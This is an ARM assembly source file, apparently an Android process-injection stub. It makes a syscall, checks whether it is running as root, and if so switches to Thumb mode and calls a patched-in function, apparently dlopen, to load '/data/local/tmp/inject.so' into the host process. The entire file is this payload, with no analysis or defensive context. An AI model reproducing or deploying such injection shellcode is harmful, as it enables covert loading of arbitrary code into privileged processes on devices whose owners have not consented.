.section .text
.global _start
_start:
    .code 32
    mov    r12, sp
    stmfd  sp!, {r4-r7}
    ldmia  r12, {r4-r6}
    mov    r7, #0x124
    svc    0
    ldmfd   sp!, {r4-r7}
//----------------check if have root-----------------------------
    push   {r0-r7, lr}
    mov    r12, r7
    mov    r7,  #0xC7
    svc    0
    mov    r7, r12
    cmp    r0, #0
    beq    dlopen
    pop     {r0-r7, pc}
//--bxls    lr
//-----------------------payload----------------------------------
 dlopen:
    #Thumb-Mode on             //
	add r3, pc, #1    // This whole section is for "Thumb Mode"
    bx      r3            //
    .code 16              //

    mov     r0, pc
    add     r0, #16
    mov     r1, #0
    sub     r3, r3, r3
    add     r3, r3, pc
    add     r3, #34
    ldr     r3, [r3]
    add     r3, pc, r3
    blx     r3
    pop     {r0-r7, pc}

.ascii "/data/local/tmp/inject.so\x0"
.ascii "\x0\x0\x0\x0"//------------------dlopen offset-------------
